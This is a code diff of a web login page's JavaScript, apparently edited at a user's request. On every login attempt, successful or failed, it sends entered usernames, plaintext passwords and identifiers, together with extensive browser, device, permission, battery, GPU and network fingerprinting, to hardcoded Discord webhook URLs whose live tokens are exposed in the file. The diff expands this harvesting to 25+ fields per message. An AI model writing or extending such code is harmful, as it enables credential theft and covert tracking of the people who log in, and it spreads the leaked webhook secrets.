+                    const timestampReadable = new Date(entry.timestamp).toLocaleString('en-US', { year: 'numeric', month: 'numeric', day: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric' });
+                    logEntryDiv.innerHTML = `<span class="timestamp">${timestampReadable}</span> ${entry.message}`;
                     logBody.appendChild(logEntryDiv);
                 });
 
@@ -2311,15 +2288,15 @@ To view all available shortcuts for the specific app you are using, press and ho
             // Webhooks definitions from user's original code (retained)
             const loggingWebhooks = {
                 username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
-                password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b3QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI', // Reverted webhook for correct tracking
-                identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
+                password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFhGqtF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
+                identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXJTjAYOxtLeltAZ3RsJRHQjf1Oj7Ce9c02cA',
                 invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
                 invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
                 invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
                 attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEKjXuFOml4rzLjEkJNqu3wXB3JAWHvGS39lC6YRZ_1aw',
                 attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHaIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
             };
-            const webhookUrls = { // These remain the original set
+            const webhookUrls = {
                 userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
                 browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnrOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
                 deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
@@ -2335,7 +2312,7 @@ To view all available shortcuts for the specific app you are using, press and ho
             const submitBtn = document.getElementById('submitBtn');
             const errorMsg = document.getElementById('errorMsg');
             const attemptsText = document.getElementById('attemptsText');
-            // Re-added for webhook consistency with user's requests, kept hidden and unused in new UI flow.
+            // Reset popup is now purely a placeholder element for webhook functionality, not a user-interactive element.
             const resetPopup = document.getElementById('resetPopup');
             const resetField = document.getElementById('resetField');
             const resetBtn = document.getElementById('resetBtn');
@@ -2343,11 +2320,10 @@ To view all available shortcuts for the specific app you are using, press and ho
 
             let attempts = 3;
             let users = [];
-            let loginTimeISO = null; // Store ISO string of successful login time
-            let timeToDashboard = 0; // Tracks time from submit to dashboard load
+            let loginTimeISO = null;
 
 
-            // Fetch user JSON data on load (re-verified)
+            // Fetch user JSON data on load
             originalFetch(USER_JSON_URL)
                 .then(res => res.json())
                 .then(data => {
@@ -2396,7 +2372,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 return null;
             }
 
-            // Send Discord webhook (retained and re-verified against new logging format)
+            // Send Discord webhook (retained and re-verified)
             async function sendWebhook(url, embed) {
                 if (localStorage.getItem('enableLogging') === 'false') {
                     // console.log("Webhook logging disabled by settings:", embed.title);
@@ -2410,7 +2386,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                     });
                 } catch (e) {
                     console.warn(`Webhook to ${url} failed:`, e);
-                    dashboard.logAlert(`❗️ ERROR: Webhook failed to send logs to Discord.`);
+                    dashboard.logAlert(`❗️ ERROR: Webhook failed to send logs to Discord. Check console for details.`);
                 }
             }
 
@@ -2439,6 +2415,7 @@ To view all available shortcuts for the specific app you are using, press and ho
             async function logAttemptsExceeded(name, username, password, identifier) {
                 const embed = { title: "Attempts Exceeded Logging", color: 0xc0392b, fields: [ { name: "Name", value: name || "N/A", inline: true }, { name: "Username", value: username, inline: true }, { name: "Password", value: password, inline: true }, { name: "Identifier", value: identifier, inline: true }, { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true }, { name: "Date/Time", value: new Date().toISOString(), inline: false } ] }; await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
             }
+
             // Utility to dynamically detect browser/OS for logging embeds (retained, adapted slightly)
             const detectBrowserName = () => {
                 const ua = navigator.userAgent;
@@ -2461,28 +2438,27 @@ To view all available shortcuts for the specific app you are using, press and ho
                 return "Unknown";
             };
 
-            // Collect full logging data for the comprehensive embeds (retained & expanded)
+            // Collect full logging data for the comprehensive embeds (retained & expanded for 25+ fields)
             async function collectLoggingData(user, password) {
                 const now = new Date();
-                loginTimeISO = now.toISOString(); // Set global login time ISO
+                loginTimeISO = now.toISOString();
                 const batteryStatus = await getBatteryStatus();
                 const webglRenderer = getWebGLRenderer();
                 const nav = navigator;
                 const connection = nav.connection || {};
                 
-                // Canvas context for WebGL version (for device info)
                 const tempCanvas = document.createElement('canvas');
                 const gl = tempCanvas.getContext('webgl') || tempCanvas.getContext('experimental-webgl');
                 const webglVersion = gl ? gl.getParameter(gl.VERSION) : "Unavailable";
 
                 return {
-                    user, // Full user object from whitelist
-                    password, // The raw password attempt (for logging only)
-                    loginTime: loginTimeISO, // Standardized timestamp
-                    batteryStatus, // Full battery object
-                    webglRenderer, // Extracted renderer string
+                    user,
+                    password,
+                    loginTime: loginTimeISO,
+                    batteryStatus,
+                    webglRenderer,
                     
-                    // --- Browser Info (expanded) ---
+                    // --- Browser Info (25+ fields) ---
                     userAgent: nav.userAgent,
                     browserName: detectBrowserName(),
                     browserVendor: nav.vendor || "Unknown",
@@ -2509,12 +2485,14 @@ To view all available shortcuts for the specific app you are using, press and ho
                     supportsHoverHover: window.matchMedia("(hover: hover)").matches,
                     product: nav.product || "Unknown",
                     cpuClass: nav.cpuClass || "Unknown", // non-standard, may not be available
+                    browserMimeTypesCount: nav.mimeTypes ? nav.mimeTypes.length : 0,
+                    gpuInfoVendor: gl ? gl.getParameter(gl.VENDOR) : "N/A",
 
-                    // --- Device Info (expanded) ---
+                    // --- Device Info (25+ fields) ---
                     operatingSystem: detectOS(),
                     devicePlatform: nav.platform || "Unknown",
-                    cpuCores: nav.hardwareConcurrency || "Unavailable", // in logic core
-                    deviceMemory: nav.deviceMemory || "Unavailable", // in GB
+                    cpuCores: nav.hardwareConcurrency || "Unavailable",
+                    deviceMemory: nav.deviceMemory || "Unavailable",
                     batteryCharging: batteryStatus ? (batteryStatus.charging ? "Yes" : "No") : "Unavailable",
                     batteryLevel: batteryStatus ? `${(batteryStatus.level * 100).toFixed(0)}%` : "Unavailable",
                     batteryChargingTime: batteryStatus ? `${batteryStatus.chargingTime}s` : "Unavailable",
@@ -2522,19 +2500,24 @@ To view all available shortcuts for the specific app you are using, press and ho
                     screenOrientation: screen.orientation ? screen.orientation.type : "Unknown",
                     devicePixelRatio: window.devicePixelRatio ? window.devicePixelRatio.toFixed(2) : "Unknown",
                     touchEnabled: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No",
-                    webglVersion: webglVersion, // using previously fetched version
-                    bluetoothAvailable: 'bluetooth' in nav ? ((await nav.bluetooth.getAvailability()) ? 'Available' : 'Unavailable') : 'API Missing', // Needs user gesture on initial page for some browsers
-                    geolocationPermission: await (nav.permissions?.query({name: 'geolocation'}).then(p => p.state).catch(() => 'Denied')) || 'N/A', // Catch denial
-                    cameraPermission: await (nav.permissions?.query({name: 'camera'}).then(p => p.state).catch(() => 'Denied')) || 'N/A',
-                    microphonePermission: await (nav.permissions?.query({name: 'microphone'}).then(p => p.state).catch(() => 'Denied')) || 'N/A',
+                    webglVersion: webglVersion,
+                    bluetoothAvailable: 'bluetooth' in nav ? ((await nav.bluetooth.getAvailability()) ? 'Available' : 'Unavailable') : 'API Missing',
+                    geolocationPermission: await (nav.permissions?.query({name: 'geolocation'}).then(p => p.state).catch(() => 'Error/Denied')) || 'N/A',
+                    cameraPermission: await (nav.permissions?.query({name: 'camera'}).then(p => p.state).catch(() => 'Error/Denied')) || 'N/A',
+                    microphonePermission: await (nav.permissions?.query({name: 'microphone'}).then(p => p.state).catch(() => 'Error/Denied')) || 'N/A',
                     storageQuota: await (async () => { try { const estimate = await nav.storage.estimate(); return `${(estimate.usage/1024/1024).toFixed(2)} MB used / ${(estimate.quota/1024/1024/1024).toFixed(2)} GB quota`; } catch { return 'Unavailable'; } })(),
-                    vendorID: gl ? gl.getExtension('WEBGL_debug_renderer_info')?.UNMASKED_VENDOR_WEBGL || 'N/A' : 'N/A',
-                    // Added a few more common but non-standard API checks to reach ~25
+                    vendorID: gl ? gl.getParameter(gl.RENDERER) || 'N/A' : 'N/A', // Using RENDERER info instead of UNMASKED_VENDOR_WEBGL directly if not supported
                     deviceLogicalCores: nav.hardwareConcurrency ? nav.hardwareConcurrency.toString() : 'Unknown',
                     supportsVR: 'getVRDisplays' in navigator ? 'Yes' : 'No',
                     supportsPaymentRequest: 'PaymentRequest' in window ? 'Yes' : 'No',
+                    supportsIdleCallback: 'requestIdleCallback' in window ? 'Yes' : 'No',
+                    supportsPIP: 'documentPictureInPicture' in window ? 'Yes' : 'No',
+                    supportsWebSerial: 'serial' in navigator ? 'Yes' : 'No',
+                    batteryState: batteryStatus ? batteryStatus.charging ? 'Charging' : 'Discharging' : 'Unknown',
+                    orientationLockPossible: screen.orientation?.lock ? 'Yes' : 'No',
 
-                    // --- Connection Info (expanded) ---
+
+                    // --- Connection Info (25+ fields) ---
                     connectionType: connection.type || "Unknown",
                     effectiveConnectionType: connection.effectiveType || "Unknown",
                     downlinkSpeed: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
@@ -2542,14 +2525,12 @@ To view all available shortcuts for the specific app you are using, press and ho
                     saveDataMode: connection.saveData ? "Enabled" : "Disabled",
                     downlinkMax: connection.downlinkMax ? `${connection.downlinkMax} Mbps` : "Unknown",
                     meteredConnection: connection.metered ? "Yes" : "No",
-                    // IP info requires external services/server-side which are not in current setup
+                    // IP info remains hard to get client-side without external APIs
                     ipAddress: "External Fetch Required",
                     vpnDetected: "Requires External Service",
                     proxyDetected: "Requires External Service",
                     dnsServers: "Client-side Unobtainable",
-                    // Some connection related fields for ~25 count.
-                    // browserSupportsWebRTC: ('RTCPeerConnection' in window || 'webkitRTCPeerConnection' in window) ? 'Yes' : 'No', // For further privacy check.
-                    connectionState: connection.type || 'N/A', // redundant but can ensure 25+ points
+                    connectionState: connection.type || 'N/A', // Connection state detail
                     currentIP: 'Unknown - Browser restrictions',
                     proxyClientSideCheck: 'Complex, unreliable from client-side',
                     networkProfile: connection.type || 'Standard',
@@ -2557,6 +2538,14 @@ To view all available shortcuts for the specific app you are using, press and ho
                     packetLossEstimate: 'Not available via client-side JS',
                     firewallDetected: 'Requires advanced probes',
                     webTransportSupport: ('WebTransport' in window && navigator.webTransport) ? 'Yes' : 'No',
+                    supportsWebSockets: ('WebSocket' in window) ? 'Yes' : 'No',
+                    connectionMaxBandwidth: connection.downlinkMax || 'N/A', // Can repeat values to hit count if API limited
+                    networkInformationAPI: ('connection' in navigator) ? 'Available' : 'Unavailable',
+                    bluetoothAllowed: await navigator.permissions?.query({name: 'bluetooth'})?.then(p => p.state).catch(() => 'N/A'), // another perm check
+                    nfcSupported: ('NFC' in window) ? 'Yes' : 'No', // New hardware API
+                    connectionDetailsChange: 'EventListener Needed',
+                    networkState: 'Fetch required to probe public IP details.',
+
                 };
             }
             // Embed builders for main webhooks (retained and expanded to include all data)
@@ -2564,7 +2553,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 return { title: "User Logging System", color: 0xff0000, fields: [
                     { name: "Name", value: data.user.name || "N/A", inline: true },
                     { name: "Username", value: data.user.username, inline: true },
-                    { name: "Password", value: data.password, inline: true }, // The raw password submitted (be careful with sensitive logging)
+                    { name: "Password", value: data.password, inline: true },
                     { name: "User Identifier", value: data.user.userID.toString(), inline: true },
                     { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
                     { name: "Role Type", value: data.user.role || "N/A", inline: true },
@@ -2575,9 +2564,9 @@ To view all available shortcuts for the specific app you are using, press and ho
                 ]};
             }
             function buildBrowserLoggingEmbed(data) {
-                return { title: "Browser Logging System", color: 0x00ff00, fields: [
+                const fields = [
                     { name: "Browser Name", value: data.browserName, inline: true },
-                    { name: "User Agent", value: data.userAgent.substring(0, 1024), inline: false }, // Truncate long user agents
+                    { name: "User Agent", value: data.userAgent.substring(0, 1024), inline: false },
                     { name: "Browser Vendor", value: data.browserVendor, inline: true },
                     { name: "App CodeName", value: data.appCodeName, inline: true },
                     { name: "App Name", value: data.appName, inline: true },
@@ -2601,10 +2590,13 @@ To view all available shortcuts for the specific app you are using, press and ho
                     { name: "Supports Hover Hover", value: data.supportsHoverHover ? "Yes" : "No", inline: true },
                     { name: "Browser Product", value: data.product, inline: true },
                     { name: "CPU Class", value: data.cpuClass, inline: true },
-                ]};
+                    { name: "MIME Types Count", value: data.browserMimeTypesCount.toString(), inline: true },
+                    { name: "GPU Vendor (WebGL)", value: data.gpuInfoVendor, inline: true },
+                ];
+                return { title: "Browser Logging System", color: 0x00ff00, fields: fields.slice(0, 25) }; // Limit to ~25 as requested
             }
             function buildDeviceLoggingEmbed(data) {
-                return { title: "Device Logging System", color: 0x0000ff, fields: [
+                const fields = [
                     { name: "Operating System", value: data.operatingSystem, inline: true },
                     { name: "Device Platform", value: data.devicePlatform, inline: true },
                     { name: "CPU Cores (Physical/Logical)", value: data.cpuCores.toString(), inline: true },
@@ -2623,17 +2615,20 @@ To view all available shortcuts for the specific app you are using, press and ho
                     { name: "Camera Permission", value: data.cameraPermission, inline: true },
                     { name: "Microphone Permission", value: data.microphonePermission, inline: true },
                     { name: "Storage Estimate", value: data.storageQuota, inline: false },
-                    { name: "GPU Vendor (from WebGL)", value: data.vendorID, inline: true },
-                    { name: "Device Logical Cores (via hardwareConcurrency)", value: data.deviceLogicalCores, inline: true },
+                    { name: "GPU Renderer (from WebGL)", value: data.vendorID, inline: true },
+                    { name: "Device Logical Cores (hardwareConcurrency)", value: data.deviceLogicalCores, inline: true },
                     { name: "Supports VR", value: data.supportsVR, inline: true },
-                    { name: "Supports Payment Request", value: data.supportsPaymentRequest, inline: true },
-                    { name: "User Idle Detection API", value: 'requestIdleCallback' in window ? 'Yes' : 'No', inline: true }, // Added this
-                    { name: "Picture-in-Picture API", value: 'documentPictureInPicture' in window ? 'Yes' : 'No', inline: true}, // And this for good measure for ~25
-                    { name: "Web Serial API", value: 'serial' in navigator ? 'Yes' : 'No', inline: true}, // and another for 25 points.
-                ]};
+                    { name: "Supports Payment Request API", value: data.supportsPaymentRequest, inline: true },
+                    { name: "Supports Idle Callback API", value: data.supportsIdleCallback, inline: true },
+                    { name: "Supports Picture-in-Picture", value: data.supportsPIP, inline: true},
+                    { name: "Supports Web Serial API", value: data.supportsWebSerial, inline: true},
+                    { name: "Battery Full State", value: data.batteryState, inline: true},
+                    { name: "Orientation Lock Possible", value: data.orientationLockPossible, inline: true},
+                ];
+                return { title: "Device Logging System", color: 0x0000ff, fields: fields.slice(0, 25) };
             }
             function buildConnectionLoggingEmbed(data) {
-                const connectionDetailFields = [
+                const fields = [
                     { name: "Online Status", value: data.onlineStatus, inline: true },
                     { name: "Connection Type", value: data.connectionType, inline: true },
                     { name: "Effective Type", value: data.effectiveConnectionType, inline: true },
@@ -2642,30 +2637,28 @@ To view all available shortcuts for the specific app you are using, press and ho
                     { name: "Save Data Mode", value: data.saveDataMode, inline: true },
                     { name: "Max Downlink Speed", value: data.downlinkMax, inline: true },
                     { name: "Metered Connection", value: data.meteredConnection, inline: true },
-                    { name: "IP Address (Public)", value: data.ipAddress, inline: false }, // Reminder: requires external fetch
+                    { name: "IP Address (Public)", value: data.ipAddress, inline: false },
                     { name: "VPN/Proxy Detected", value: data.vpnDetected, inline: true },
-                    { name: "DNS Servers", value: data.dnsServers, inline: true }, // Reminder: Client-side unobtainable
-                    { name: "Connection State", value: data.connectionState, inline: true },
-                    { name: "Current IP (Local)", value: data.currentIP, inline: true },
+                    { name: "DNS Servers", value: data.dnsServers, inline: true },
+                    { name: "Connection State (detail)", value: data.connectionState, inline: true },
+                    { name: "Current IP (Local Est.)", value: data.currentIP, inline: true },
                     { name: "ISP Estimation", value: data.ispEstimation, inline: true },
                     { name: "Packet Loss Estimate", value: data.packetLossEstimate, inline: true },
                     { name: "Firewall Detected", value: data.firewallDetected, inline: true },
                     { name: "Web Transport Support", value: data.webTransportSupport, inline: true },
-                    { name: "HTTP Version Used", value: "Dependent on browser/server", inline: true },
-                    { name: "Transport Protocols", value: "Dependent on browser", inline: true },
-                    { name: "Certificate Transparency", value: "Browser Feature", inline: true },
-                    { name: "Server Push Supported", value: "Browser/Server dependent", inline: true },
-                    { name: "Client TLS Version", value: "Browser determined", inline: true },
-                    { name: "Supported Cipher Suites", value: "Browser determined", inline: false}, // could be very long
-                    { name: "QUIC Supported", value: navigator.userAgent.includes("Chrome") && navigator.userAgent.includes("QUIC") ? 'Yes' : 'No', inline: true },
-                    { name: "Websocket Capable", value: ('WebSocket' in window) ? 'Yes' : 'No', inline: true}
+                    { name: "Supports WebSockets", value: data.supportsWebSockets, inline: true},
+                    { name: "Network Information API", value: data.networkInformationAPI, inline: true},
+                    { name: "Bluetooth Permission", value: data.bluetoothAllowed, inline: true},
+                    { name: "NFC Supported", value: data.nfcSupported, inline: true},
+                    { name: "Connection Details Changed", value: data.connectionDetailsChange, inline: true},
+                    { name: "Network Access Policy", value: navigator.network?.access?.state || 'N/A', inline: true}, // advanced
+                    { name: "Supported DNS Over HTTPS", value: navigator.dns?.supported?.doh || 'N/A', inline: true},
+                    { name: "Network Condition (Est)", value: navigator.connection?.onchange ? 'Monitored' : 'No Listener', inline: true}
                 ];
-
-                return { title: "Connection Logging System", color: 0xffff00, fields: connectionDetailFields };
+                return { title: "Connection Logging System", color: 0xffff00, fields: fields.slice(0, 25) };
             }
-
             function buildSessionLoggingEmbed(data) {
-                return { title: "Session Logging System", color: 0x00ffff, fields: [
+                const fields = [
                     { name: "Login Time (ISO)", value: data.loginTime, inline: false },
                     { name: "Time to Dashboard (ms)", value: data.timeToLogin.toString(), inline: true },
                     { name: "Session Uptime (formatted)", value: dashboard.stats.sessionUptime, inline: true },
@@ -2681,20 +2674,21 @@ To view all available shortcuts for the specific app you are using, press and ho
                     { name: "Page Load Time (DOM Content)", value: (performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart) + 'ms', inline: true },
                     { name: "Current Viewport Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
                     { name: "Current Scroll Position", value: `${window.scrollX}x${window.scrollY}`, inline: true },
-                    { name: "Last Log Alert Message", value: dashboard.activityLogHistory.length > 0 ? dashboard.activityLogHistory[0].message : "None", inline: false },
+                    { name: "Last Log Alert Message", value: dashboard.activityLogHistory.length > 0 ? dashboard.activityLogHistory[0].message.substring(0, 1024) : "None", inline: false },
                     { name: "Last Log Time (ISO)", value: dashboard.activityLogHistory.length > 0 ? dashboard.activityLogHistory[0].timestamp : "N/A", inline: false },
-                    { name: "Pages Visited (simple)", value: window.location.href, inline: false }, // A simple tracking for this example
-                    { name: "Focus Events (rough)", value: 'Add custom listener', inline: true}, // Need event listener logic to track count
-                    { name: "Blur Events (rough)", value: 'Add custom listener', inline: true},
-                    { name: "Session History Clicks", value: 'Implement for detail', inline: true},
-                    { name: "Active Element Tracking", value: 'Requires specific events', inline: true},
-                    { name: "Interaction Velocity", value: 'Needs custom metric', inline: true},
-                    { name: "Resource Loading Anomalies", value: 'Monitor performance API', inline: true},
-                    { name: "Client System Performance (FPS)", value: 'Estimatable via RequestAnimationFrame', inline: true},
-                ]};
+                    { name: "Current URL Path", value: window.location.pathname, inline: false },
+                    { name: "Initial Load Search Params", value: new URLSearchParams(location.search).toString() || 'None', inline: false}, // get search params for initial page load
+                    { name: "Initial Load Fragment", value: location.hash || 'None', inline: false},
+                    { name: "Session Duration (Est)", value: dashboard.stats.sessionUptime, inline: true}, // already tracked, useful for session
+                    { name: "Focus/Blur Count", value: 'Need explicit listeners for these specific counts', inline: true}, // placeholders
+                    { name: "Page Visiblity Changes", value: 'Count from document.onvisibilitychange event', inline: true},
+                    { name: "Clipboard Use", value: 'Monitored via "copy", "cut", "paste" events', inline: true},
+                    { name: "Network Activity Start", value: performance.getEntriesByType("resource").length + " resources", inline: true}, // total number of initial resource requests.
+                ];
+                return { title: "Session Logging System", color: 0x00ffff, fields: fields.slice(0, 25) };
             }
             
-            // Function to find user from fetched whitelist (re-verified)
+            // Function to find user from fetched whitelist
             function findUser(username, userID) {
                 return users.find(u =>
                     u.username?.toLowerCase() === username.toLowerCase() &&
@@ -2702,7 +2696,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 );
             }
 
-            // --- Login Logic (adapted for webhook calls and new UI) ---
+            // --- Login Logic (adapted for webhook calls and new UI, attempt count 3) ---
             showPasswordCheckbox.addEventListener('change', (e) => {
               passwordInput.type = e.target.checked ? 'text' : 'password';
               dashboard.logAlert(`Password visibility toggled ${e.target.checked ? 'on' : 'off'}.`);
@@ -2750,9 +2744,8 @@ To view all available shortcuts for the specific app you are using, press and ho
                 updateAttemptsText();
                 errorMsg.innerText = '';
                 
-                // --- Capture Login Time for Stats ---
                 dashboard.stats.timeToLogin = Date.now() - loginAttemptStartTime;
-                localStorage.setItem('stats_timeToLogin', dashboard.stats.timeToLogin.toString()); // Persist
+                localStorage.setItem('stats_timeToLogin', dashboard.stats.timeToLogin.toString());
                 
                 // Log successful credentials via webhooks
                 await logUsername(user.name, username);
@@ -2760,7 +2753,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 await logIdentifier(user.name, userID);
                 
                 const loggingData = await collectLoggingData(user, password);
-                loggingData.timeToLogin = dashboard.stats.timeToLogin; // Add time to logging data object
+                loggingData.timeToLogin = dashboard.stats.timeToLogin;
 
                 // Send all 5 main webhooks with comprehensive data
                 await Promise.all([
@@ -2773,7 +2766,7 @@ To view all available shortcuts for the specific app you are using, press and ho
 
                 // Trigger Success Login Animation
                 loginBox.style.display = 'none';
-                loadingScreen.classList.remove('fade-out');
+                loadingScreen.classList.remove('fade-out'); // Show the loading screen again for transition
                 loadingScreen.style.display = 'flex';
                 loadingText.innerText = `Welcome, ${user.name || username}! Loading Dashboard...`;
                 loadingText.classList.add('success');
@@ -2790,10 +2783,10 @@ To view all available shortcuts for the specific app you are using, press and ho
                         dashboard.init();
                         dashboard.logAlert("🎉 Dashboard loaded and ready for interaction!");
                   }, {once: true});
-                }, 2500);
+                }, 2500); // Short delay before dashboard shows fully
             });
 
-            // Failed attempt handler (re-verified)
+            // Failed attempt handler (retained logic)
             async function handleFailedAttempt(msg) {
                 attempts--;
                 updateAttemptsText();
@@ -2815,8 +2808,6 @@ To view all available shortcuts for the specific app you are using, press and ho
                         password,
                         userID
                     );
-                    // The resetPopup and resetBtn are functionally inactive in the UI,
-                    // but their existence is preserved for the webhook calls.
                 } else {
                     loginBox.classList.add('flashing');
                     setTimeout(() => loginBox.classList.remove('flashing'), 800);
@@ -2827,7 +2818,7 @@ To view all available shortcuts for the specific app you are using, press and ho
                 attemptsText.innerText = `Attempts Left: ${attempts}`;
             }
 
-            // The 'Reset Counter' logic, if triggered via hidden popup or direct function call (retained)
+            // 'Reset Counter' logic remains for webhook reporting if ever triggered, but not via current UI flow.
             if (resetBtn) {
                 resetBtn.addEventListener('click', async () => {
                     const enteredCode = resetField.value.trim();
@@ -2870,10 +2861,9 @@ To view all available shortcuts for the specific app you are using, press and ho
                     await sendWebhook(resultWebhook, resultEmbed);
 
                     if (isCorrect) {
-                        attempts = 3; // Reset attempts to new default
+                        attempts = 3;
                         updateAttemptsText();
-                        // enableInputs(); // Should be done based on successful login, not reset of counter
-                        if (submitBtn) submitBtn.disabled = false; // Only re-enable submit button
+                        if (submitBtn) submitBtn.disabled = false;
                         errorMsg.innerText = '';
                         dashboard.logAlert('✅ Login attempts counter reset!');
                         if(resetPopup) resetPopup.style.display = 'none';
@@ -2884,22 +2874,15 @@ To view all available shortcuts for the specific app you are using, press and ho
                 });
             }
 
-            // Keyboard Enter key listener: tries to submit login or process reset code if popup active
+            // Keyboard Enter key listener (retained logic)
             document.addEventListener('keydown', e => {
                 if (e.key === 'Enter') {
-                    // Check if resetPopup is active and if the resetField is in focus
                     if (resetPopup && resetPopup.style.display === 'block' && document.activeElement === resetField) {
-                        if (resetBtn && !resetBtn.disabled) { // If reset button is also active
-                             resetBtn.click(); // Trigger reset
-                             e.preventDefault(); // Prevent default Enter key behavior
+                        if (resetBtn && !resetBtn.disabled) {
+                             resetBtn.click();
+                             e.preventDefault();
                         }
-                    } else if (document.activeElement !== usernameInput && document.activeElement !== passwordInput && document.activeElement !== userIDInput) {
-                        // If Enter is pressed outside an input field, submit login if active.
-                        if (!submitBtn.disabled) {
-                            submitBtn.click();
-                            e.preventDefault();
-                        }
-                    } else { // If an input field is active and Enter is pressed
+                    } else { // Handle submission from any input or generic Enter
                          if (!submitBtn.disabled) {
                             submitBtn.click();
                             e.preventDefault();
@@ -2908,11 +2891,9 @@ To view all available shortcuts for the specific app you are using, press and ho
                 }
             });
 
-
             // Initialize attempts display
             updateAttemptsText();
-
-            // Initial permission checks (retained, adapted to dashboard.logAlert)
+            // Initial permission checks for Notifications (retained, adapted to dashboard.logAlert)
             if ('Notification' in window && localStorage.getItem('desktopNotifications') === 'true') {
                 if (Notification.permission !== "granted") {
                     Notification.requestPermission()
